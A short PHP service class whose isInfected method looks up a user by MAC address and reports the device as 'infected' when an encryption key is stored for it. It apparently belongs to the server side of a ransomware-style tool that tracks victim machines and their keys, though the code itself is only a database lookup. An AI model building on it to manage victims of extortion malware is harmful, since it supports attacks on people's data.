<?php

namespace App\Service\API;

use App\Repository\UserRepository;

class UserService {
    /**
     * @var UserRepository
     */
    private UserRepository $userRepository;

    public function __construct(UserRepository $userRepository)
    {
        $this->userRepository = $userRepository;
    }

    /**
     * Check if device is infected
     * @param string $macAddress
     * @return bool
     */
    public function isInfected(string $macAddress): bool {
        $user = $this->userRepository->findOneBy(['macAddress' => $macAddress]);
        if (!$user) {
            return false;    
        }
        if ($user->getEncryptionKey() !== null) {
            return true;
        }
        return false;
    }
}
